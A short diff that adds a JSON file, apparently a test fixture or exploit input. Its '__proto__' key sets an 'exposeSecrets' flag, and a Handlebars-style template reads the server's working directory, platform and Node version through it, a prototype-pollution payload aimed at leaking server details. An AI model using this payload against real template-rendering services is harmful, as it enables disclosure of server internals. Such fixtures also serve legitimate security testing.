@@ -1,0 +1,7 @@
+{
+    "__proto__": {
+      "exposeSecrets": true
+    },
+    "template": "{{#with exposedSecrets.serverInfo}}{{cwd}}, {{platform}}, {{nodeVersion}}{{/with}}",
+    "context": {}
+  }
